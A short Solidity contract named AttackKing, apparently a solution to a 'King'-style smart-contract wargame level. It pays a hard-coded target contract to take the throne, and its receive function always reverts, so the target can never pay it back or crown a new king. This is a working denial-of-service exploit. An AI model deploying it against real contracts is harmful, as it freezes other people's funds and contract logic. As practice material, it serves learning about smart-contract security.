// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {

  address payable owner;
  address payable king_contract = 0x0E9aaa1AF8F3EF32aC05dd177ca9DD4Ea1a6bf51;

  constructor() public {
    owner = msg.sender;
  }

  function set_king(address contract_address) public {
    require(msg.sender == owner);
    king_contract = payable(contract_address);
  }

  function refund() external {
    require(msg.sender == owner);
    owner.transfer(address(this).balance);
  }

  function claim() public payable {
    require(msg.sender == owner);
    king_contract.transfer(msg.value);
  }

  receive() external payable {
    require(1 == 0);
  }
}